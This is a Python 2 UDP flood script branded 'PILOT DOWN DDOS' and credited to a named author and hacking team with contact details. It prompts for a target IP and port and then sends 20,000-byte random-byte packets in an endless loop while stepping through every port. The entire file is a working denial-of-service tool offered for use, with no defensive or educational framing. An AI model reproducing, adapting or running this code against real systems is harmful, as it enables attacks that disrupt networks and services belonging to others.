import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(20000)
#############

os.system("clear")
print("""\033[1;32m
 ____ ___ _     ___ _____   ____   _____        ___   _
|  _ \_ _| |   / _ \_   _| |  _ \ / _ \ \      / / \ | |
| |_) | || |  | | | || |   | | | | | | \ \ /\ / /|  \| |
|  __/| || |__| |_| || |   | |_| | |_| |\ V  V / | |\  |
|_|  |___|_____\___/ |_|   |____/ \___/  \_/\_/  |_| \_|

 ____  ____   ___  ____
|  _ \|  _ \ / _ \/ ___|
| | | | | | | | | \___ \\
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/""")
print
print "\033[1;32mAuthor   : Mr.Pilot"
print "\033[1;32mTEAM     : MUSLIM CYBER COMMUNITY"
print "\033[1;32mGithub   : https://github.com/Tools-MrPilot"
print "\033[1;32mIG       : pilot_azka_aldric"
print "\033[1;32mWhatsapp : 088228984977"
print "\033[1;32mThanks   : All Member MCC"
print "\033[1;32mTingkat  : Newbie Berkarya"
print
ip = raw_input("IP Target : ")
port = input("Port      : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
